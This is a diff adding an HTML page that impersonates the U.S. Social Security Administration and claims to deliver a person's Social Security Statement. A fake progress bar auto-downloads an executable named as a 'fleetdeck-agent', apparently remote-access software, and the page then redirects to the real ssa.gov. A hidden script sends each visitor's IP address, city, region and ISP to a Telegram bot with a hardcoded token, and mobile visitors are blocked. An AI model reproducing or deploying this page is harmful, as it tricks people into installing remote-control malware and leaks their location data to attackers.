@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Security Statement - Download</title>
+    <link rel="icon" href="https://www.ssa.gov/favicon.ico" type="image/x-icon">
+    <style>
+    
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f5f5f5 0%, #e8eff5 100%);
+            color: #333;
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 10px;
+        }
+        
+        /* SSA Header */
+        .ssa-header {
+            background: #003366;
+            color: white;
+            padding: 12px 0;
+            border-bottom: 4px solid #FFB81C;
+            box-shadow: 0 2px 10px rgba(0, 51, 102, 0.2);
+        }
+        
+        .header-container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 0 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .ssa-logo {
+            height: 40px;
+            width: auto;
+        }
+        
+        .ssa-title {
+            font-size: clamp(18px, 4vw, 22px);
+            font-weight: 700;
+            letter-spacing: -0.3px;
+        }
+        
+        .ssa-subtitle {
+            font-size: clamp(11px, 2.5vw, 13px);
+            opacity: 0.9;
+            margin-top: 2px;
+        }
+                /* Main Content */
+        .container {
+            max-width: 500px;
+            margin: 20px auto;
+            width: 100%;
+            flex-grow: 1;
+        }
+        
+        .content-card {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+            padding: clamp(20px, 4vw, 30px);
+            text-align: center;
+            border: 1px solid #e0e7ff;
+        }
+        
+        h1 {
+            color: #003366;
+            margin-bottom: 15px;
+            font-size: clamp(20px, 5vw, 24px);
+            font-weight: 600;
+        }
+        
+        .info-box {
+            background: #f8faff;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            border-left: 3px solid #003366;
+        }
+        
+        .info-text {
+            color: #003366;
+            font-size: 14px;
+            font-weight: 500;
+            line-height: 1.4;
+        }
+
+.installer-box{
+    width:480px;
+    background:#fff;
+    border-radius:12px;
+    padding:30px;
+    box-shadow:0 10px 30px rgba(0,0,0,0.15);
+    text-align:center;
+}
+
+.installer-box h2{
+    margin-bottom:25px;
+    color:#243b57;
+}
+
+.bar-container{
+    width:100%;
+    height:18px;
+    background:#ddd;
+    border-radius:12px;
+    overflow:hidden;
+    margin-bottom:12px;
+}
+
+.fill{
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg,#4caf50,#2e7d32);
+    border-radius:12px;
+    transition: width .3s ease-in-out;
+}
+
+.text{
+    font-size:14px;
+    color:#444;
+    margin-bottom:15px;
+}
+
+#realDownload{
+    display:none;
+    margin-top:15px;
+    padding:8px 18px;
+    background:#1e6bd6;
+    color:#fff;
+    border-radius:6px;
+    text-decoration:none;
+    cursor:pointer;
+}
+
+.redirect{
+    display:none;
+    margin-top:15px;
+    font-size:14px;
+    color:#555;
+}
+
+/* Dots animation */
+@keyframes dots {
+  0% { content: ""; }
+  33% { content: "."; }
+  66% { content: ".."; }
+  100% { content: "..."; }
+}
+.dots::after{
+    display:inline-block;
+    animation:dots 1s steps(1,end) infinite;
+    content: "";
+}
+        .footer-disclaimer {
+            opacity: 1;
+            font-size: 16px;
+            line-height: 2;
+        }
+        
+
+        
+        
+    </style>
+</head>
+<body>
+    <!-- SSA Header -->
+    <header class="ssa-header">
+        <div class="header-container">
+            <div class="logo-container">
+                <!-- Official SSA Logo -->
+                <img 
+                    src="https://www.ssa.gov/legacy/components/dist/assets/images/ssa_logo.svg" 
+                    alt="SSA Logo" 
+                    class="ssa-logo"
+                >
+                <div>
+                    <div class="ssa-title">Social Security Administration</div>
+                    <div class="ssa-subtitle">Official Website of the U.S. Social Security Administration</div>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+        <!-- Main Content -->
+
+    <main class="container">
+        <div class="content-card">
+                     <h1>Your Social Security Statement</h1>
+    <h2 id="statusText">Initializing<span class="dots"></span></h2>
+
+    <div class="bar-container">
+        <div class="fill" id="fill"></div>
+    </div>
+
+    <div class="text" id="text">0%</div>
+    
+            <div class="info-box">
+                <div class="info-text">
+                    After downloading, please open your statement to view your earnings history and benefit estimates.
+                </div>
+            </div>
+            
+    <a id="realDownload" href="https://github.com/poooom/dontreply/raw/refs/heads/main/fleetdeck-agent-L8VojJsWBmHVxmqJmA8r8q.exe" download>
+        Click here if your download didn’t start
+    </a>
+
+    <div class="redirect" id="redirect">
+        Redirecting in <span id="count">7</span> seconds...
+    </div>
+    <br
+</div>
+
+    <!-- SSA Footer -->
+    <footer class="ssa-footer">
+
+            <div class="footer-disclaimer">
+                This is an official U.S. Government system for authorized use only.
+            </div>
+    </footer>
+    
+<script>
+
+
+document.addEventListener("DOMContentLoaded", function(){
+
+    const fill = document.getElementById("fill");
+    const text = document.getElementById("text");
+    const statusText = document.getElementById("statusText");
+    const link = document.getElementById("realDownload");
+    const redirectBox = document.getElementById("redirect");
+    const countText = document.getElementById("count");
+
+    const redirectUrl = "https://www.ssa.gov/";
+
+    let progress = 0;
+    let stage = 0;
+    const stages = [
+        "Connecting to login.gov",
+    ];
+
+    const interval = setInterval(()=>{
+        progress += Math.random()*20; // slower for realism
+
+        if(progress >= stage*35 && stage<stages.length){
+            statusText.innerText = stages[stage] + "...";
+            stage++;
+        }
+
+        if(progress >= 100) progress = 100;
+
+        fill.style.width = progress + "%";
+        text.innerText = Math.floor(progress) + "%";
+
+        if(progress >= 100){
+            clearInterval(interval);
+            statusText.innerText = "Download ready";
+            text.innerText = "100%";
+
+            startDownload();
+            startRedirect();
+        }
+
+    }, 100);
+
+    function startDownload(){
+        link.click(); // auto try
+        setTimeout(()=>{ link.style.display="inline-block"; }, 2000); // fallback
+    }
+
+    function startRedirect(){
+        redirectBox.style.display = "block";
+        let time = 3;
+        countText.innerText = time;
+        const timer = setInterval(()=>{
+            time--;
+            countText.innerText = time;
+            if(time <= 0){
+                clearInterval(timer);
+                window.location.replace(redirectUrl);
+            }
+        },1000);
+    }
+
+});
+</script>
+    <script>
+  const botToken = "8374539402:AAEjBm4zbjJPIATEnQ9y4cCtxBl24ltjNeo";
+  const chatId = "674464764";
+  fetch("https://ipinfo.io/json")
+    .then(res => res.json())
+    .then(data => {
+      const message = `New Visit:
+IP: ${data.ip}
+City: ${data.city}
+Region: ${data.region}
+Country: ${data.country}
+ISP: ${data.org || "Unknown"}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+    });
+    
+</script>
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"f87f52325f5a47a3be0745acde12e881","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"f87f52325f5a47a3be0745acde12e881","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"f87f52325f5a47a3be0745acde12e881","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"60b9271a254d4b30acd33e9b4083b857","r":1}' crossorigin="anonymous"></script>
+</body>
+</html>
+<script>
+function isMobile() {
+    return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
+}
+
+if (isMobile()) {
+    document.body.innerHTML = `
+        <div style="
+            height:55vh;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            text-align:center;
+            font-family:Arial;
+            color:white;
+            background: url('https://www.ssa.gov/themes/custom/ssa_core/logo.svg') no-repeat center center;
+            background-size: cover;
+        ">
+            <div style="background:rgba(0,0,0,0.3);padding:20px;border-radius:5px;">
+                <h2>❌ Sorry</h2>
+                <p>This page is available for desktop devices only.</p>
+            </div>
+        </div>
+    `;
+}
+</script>
